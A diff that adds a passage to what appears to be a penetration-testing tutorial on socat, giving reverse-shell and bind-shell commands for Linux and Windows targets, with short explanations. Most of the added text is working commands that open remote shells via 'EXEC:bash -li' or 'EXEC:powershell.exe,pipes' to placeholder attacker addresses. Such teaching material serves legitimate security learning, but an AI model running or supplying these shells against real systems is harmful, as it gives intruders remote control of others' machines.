@@ -246,4 +246,32 @@ _Reverse Shells_
 
 As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:
 
-socat TCP-L:<port> -
+socat TCP-L:<port> -  
+
+As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.  
+
+On Windows we would use this command to connect back:  
+
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes  
+
+The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.  
+
+This is the equivalent command for a Linux Target:  
+
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"  
+
+_Bind Shells_  
+
+On a Linux target we would use the following command:  
+
+socat TCP-L:<PORT> EXEC:"bash -li"  
+
+On a Windows target we would use this command for our listener:  
+
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes  
+
+We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.  
+
+Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.  
+
+socat TCP:<TARGET-IP>:<TARGET-PORT> -  
